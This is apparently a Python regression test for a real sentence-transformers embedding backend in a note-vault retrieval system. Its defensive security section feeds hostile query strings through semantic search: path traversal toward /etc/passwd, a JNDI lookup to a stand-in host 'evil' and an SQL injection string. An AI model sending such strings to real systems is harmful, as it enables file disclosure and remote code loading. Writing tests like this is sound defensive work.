#!/usr/bin/env python3
"""Regression suite for the REAL embedding backend
(tools/sentence_transformers_backend.py) — distinct from
tests/test_embedding_boundary.py, which tests the CONTRACT with a
dependency-free test double and must keep passing on a machine without
`sentence-transformers`/`torch` installed.

This suite requires the real optional dependency (tools/requirements-semantic.txt).
If it isn't installed, this file reports that plainly and exits 0 (skipped,
not failed) — a missing optional dependency is not a test failure, per this
project's own "core retrieval system must still function when the embedding
dependency is absent" principle, extended here to the test suite itself.

Standalone, self-contained, no pytest — matches every sibling suite's
convention.
"""
from __future__ import annotations

import hashlib
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
TOOLS = REPO / "tools"
MAIN_FIXTURES = REPO / "tests" / "fixtures" / "vaults"

sys.path.insert(0, str(TOOLS))
sys.path.insert(0, str(MAIN_FIXTURES))

try:
    import sentence_transformers_backend as stb  # noqa: E402
    _BACKEND_IMPORTABLE = True
except ImportError:
    _BACKEND_IMPORTABLE = False

import memory_runtime as rt  # noqa: E402
import memory_retrieval as mret  # noqa: E402
import embedding_backend as eb  # noqa: E402
import embedding_index as ei  # noqa: E402
import build_fixtures as bf  # noqa: E402

PROBLEMS = []


def check(label: str, condition: bool, detail: str = ""):
    if not condition:
        PROBLEMS.append("%s%s" % (label, (": " + detail) if detail else ""))


def note(memory_status=None, extra="", title="Note", project="personal"):
    lines = ["---", "status: active", "project: %s" % project, "type: reference"]
    if memory_status:
        lines.append("memory_status: %s" % memory_status)
    if extra:
        lines.append(extra.strip())
    lines += ["---", "# %s" % title, ""]
    return "\n".join(lines)


def build_vault(tmp: Path, name: str, files: dict) -> Path:
    root = tmp / name
    for rel, content in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8", newline="\n")
    return root


def file_hashes(root: Path) -> dict:
    out = {}
    for p in sorted(root.rglob("*")):
        if p.is_file():
            out[str(p.relative_to(root)).replace("\\", "/")] = hashlib.sha256(p.read_bytes()).hexdigest()
    return out


def main() -> int:
    if not _BACKEND_IMPORTABLE:
        print("SKIPPED: sentence_transformers_backend could not be imported "
              "(optional dependency tools/requirements-semantic.txt not installed). "
              "This is expected on a machine without the real backend — not a failure.")
        return 0

    with tempfile.TemporaryDirectory() as td:
        tmp = Path(td)
        backend = stb.SentenceTransformerBackend()

        if not backend.is_available():
            print("SKIPPED: sentence_transformers_backend is importable but the model failed to load "
                  "(likely no network access for the first-time model download). Not a test failure.")
            return 0

        # ============================================================
        # REAL IMPLEMENTATION: interface conformance and identity
        # ============================================================
        check("REAL: satisfies the EmbeddingBackend Protocol", isinstance(backend, eb.EmbeddingBackend))
        check("REAL: backend_id is stable", backend.backend_id() == "sentence-transformers")
        check("REAL: model_id names the expected model", backend.model_id().startswith(stb.MODEL_ID))
        check("REAL: dimensions() is 384 for all-MiniLM-L6-v2", backend.dimensions() == 384,
              "got %r" % (backend.dimensions(),))

        # ============================================================
        # REAL IMPLEMENTATION: determinism
        # ============================================================
        v1 = backend.embed("The vault remains the source of truth.")
        v2 = backend.embed("The vault remains the source of truth.")
        check("REAL: identical text produces identical vectors (determinism)", v1 == v2)

        # ============================================================
        # REAL IMPLEMENTATION: genuine semantic similarity (not lexical)
        # ============================================================
        related_a = backend.embed("Apples and oranges are common fruits.")
        related_b = backend.embed("Bananas and grapes are popular produce.")
        unrelated = backend.embed("The stock market fluctuated during trading.")
        sim_related = eb.cosine_similarity(related_a, related_b)
        sim_unrelated = eb.cosine_similarity(related_a, unrelated)
        check("REAL: semantically related sentences (no shared keywords) score higher than unrelated ones",
              sim_related > sim_unrelated, "related=%.4f unrelated=%.4f" % (sim_related, sim_unrelated))

        # ============================================================
        # REAL IMPLEMENTATION: batch behavior, ordering, edge-case inputs
        # ============================================================
        def _close(a, b, tol=1e-5):
            return len(a) == len(b) and all(abs(x - y) < tol for x, y in zip(a, b))

        batch = backend.embed_batch(["one", "two", "three"])
        check("REAL: embed_batch preserves order and count, matching single-item embed() within "
              "float32-epsilon tolerance (batched vs. unbatched transformer inference differs by ~1e-7 "
              "due to padding/attention-mask effects — a known, documented, real numerical property, "
              "not a correctness bug; see sentence_transformers_backend.py's own docstring)",
              len(batch) == 3 and _close(batch[0], backend.embed("one")) and _close(batch[2], backend.embed("three")))
        for label, value in (("empty string", ""), ("whitespace-only", "   \n\t "), ("None", None),
                             ("non-string int", 12345), ("unicode", "日本語 🎉 émoji"),
                             ("extremely long (50000 chars)", "word " * 10000)):
            try:
                v = backend.embed(value)
                check("REAL edge case [%s]: embeds cleanly, correct dimensionality" % label, len(v) == 384)
            except Exception as exc:
                check("REAL edge case [%s]: must not raise" % label, False, "raised %r" % (exc,))

        # ============================================================
        # Full pipeline, real vault: EmbeddingIndex build/save/load with
        # REAL vectors, freshness gate, identity/lifecycle authority
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/fruit-current.md"] = note("current", "last_confirmed: 2026-08-29", "Fruit Current") + \
            "\nApples and oranges are common fruits found in most grocery stores.\n"
        files["00 - Inbox/fruit-candidate.md"] = note("candidate", "source: inferred\nconfidence: low", "Fruit Candidate") + \
            "\nBananas and grapes are also popular fruit choices.\n"
        files["00 - Inbox/unrelated.md"] = note("current", "last_confirmed: 2026-08-29", "Unrelated") + \
            "\nThe stock market fluctuated wildly during the trading session.\n"
        root = build_vault(tmp, "v1", files)
        hashes_before = file_hashes(root)
        runtime = rt.MemoryRuntime(root)
        eidx = ei.EmbeddingIndex.build(runtime.vault, backend)
        check("REAL: EmbeddingIndex.build() succeeds with the real backend", eidx is not None)
        check("REAL: is_fresh_for() true immediately after build", eidx.is_fresh_for(runtime.vault, backend) is True)

        p = tmp / "real.json"
        eidx.save(p)
        loaded = ei.EmbeddingIndex.load(p)
        check("REAL: save/load round-trip is lossless for real float vectors", loaded.to_json() == eidx.to_json())
        check("REAL: rebuild_is_identical() — rebuilding from the same vault with the same real backend "
              "produces identical logical content (real re-embedding pass, not cached)",
              eidx.rebuild_is_identical(runtime.vault, backend) is True)

        # No-keyword-overlap semantic query, through the FULL identity/lifecycle pipeline
        runtime2 = rt.MemoryRuntime(root, embedding_backend=backend, embedding_index=eidx)
        validated = runtime2.retrieve("fresh produce you'd find at a market", methods=("semantic",))
        current_hit = next((vc for vc in validated if vc.note_path == "00 - Inbox/fruit-current.md"), None)
        candidate_hit = next((vc for vc in validated if vc.note_path == "00 - Inbox/fruit-candidate.md"), None)
        unrelated_hit = next((vc for vc in validated if vc.note_path == "00 - Inbox/unrelated.md"), None)
        check("REAL: semantic query with ZERO keyword overlap still finds the fruit notes by meaning",
              current_hit is not None and candidate_hit is not None, "got %r" % ([vc.note_path for vc in validated],))
        check("REAL: current fruit note is accepted", current_hit is not None and current_hit.accepted is True)
        check("REAL: candidate fruit note stays unaccepted regardless of its (high) semantic score",
              candidate_hit is not None and candidate_hit.accepted is False and candidate_hit.status_track == "candidate")
        check("REAL: acceptance is NOT a function of score — the lower-scoring unrelated CURRENT note "
              "is still accepted, while the higher-scoring CANDIDATE note is not",
              unrelated_hit is not None and unrelated_hit.accepted is True
              and candidate_hit is not None and candidate_hit.score > unrelated_hit.score
              and candidate_hit.accepted is False,
              "unrelated=%r candidate=%r" % (unrelated_hit, candidate_hit))

        # ============================================================
        # Freshness / integrity with the REAL backend: wrong model,
        # wrong dims, content drift
        # ============================================================
        class RelabeledBackend:
            """Wraps the already-loaded real backend, only spoofing its
            reported model_id — no second real model is loaded, keeping this
            check fast while still exercising the real is_fresh_for() gate."""
            def is_available(self): return backend.is_available()
            def backend_id(self): return backend.backend_id()
            def model_id(self): return "sentence-transformers/a-different-model-entirely"
            def dimensions(self): return backend.dimensions()
            def embed(self, text): return backend.embed(text)
            def embed_batch(self, texts): return backend.embed_batch(texts)
        check("REAL: is_fresh_for() False against a differently-identified model (same real vectors, different model_id)",
              eidx.is_fresh_for(runtime.vault, RelabeledBackend()) is False)
        check("REAL: header records the resolved model revision (reproducibility)",
              "@" in eidx.header.model_id or eidx.header.model_id == backend.model_id(),
              "got %r" % (eidx.header.model_id,))

        (root / "00 - Inbox/fruit-current.md").write_text(
            note("current", title="Fruit Current CHANGED") + "\nSomething else entirely.\n", encoding="utf-8", newline="\n")
        runtime_changed = rt.MemoryRuntime(root)
        check("REAL: content drift invalidates the real embedding index", eidx.is_fresh_for(runtime_changed.vault, backend) is False)
        (root / "00 - Inbox/fruit-current.md").write_text(
            note("current", "last_confirmed: 2026-08-29", "Fruit Current") +
            "\nApples and oranges are common fruits found in most grocery stores.\n", encoding="utf-8", newline="\n")

        # ============================================================
        # Security: traversal/injection-shaped query TEXT through the
        # REAL backend — must never escape the vault or touch a filesystem
        # ============================================================
        for q in ["../../../../etc/passwd", "/etc/passwd", "..\\..\\..\\Windows",
                  "${jndi:ldap://evil/a}", "'; DROP TABLE notes; --"]:
            r = mret.search(runtime.vault, q, methods=("semantic",), embedding_backend=backend, embedding_index=eidx)
            for c in r:
                resolved = (root / c.note_path).resolve()
                check("REAL security: result for %r stays inside vault root" % q,
                      str(resolved).startswith(str(root.resolve())), "escaped to %r" % (resolved,))

        # ============================================================
        # Mutation proof
        # ============================================================
        hashes_after = file_hashes(root)
        check("REAL: vault byte-identical before vs. after this suite (deliberate edit was restored)",
              hashes_before == hashes_after,
              "changed: %r" % ({k for k in hashes_before if hashes_before.get(k) != hashes_after.get(k)},))

    if PROBLEMS:
        print("FAILED (%d):" % len(PROBLEMS))
        for p in PROBLEMS:
            print("  - %s" % p)
        return 1
    print("PASS: real sentence-transformers backend — interface conformance, determinism, genuine semantic "
          "similarity, full identity/lifecycle pipeline integration, freshness/integrity, and security all hold")
    return 0


if __name__ == "__main__":
    sys.exit(main())
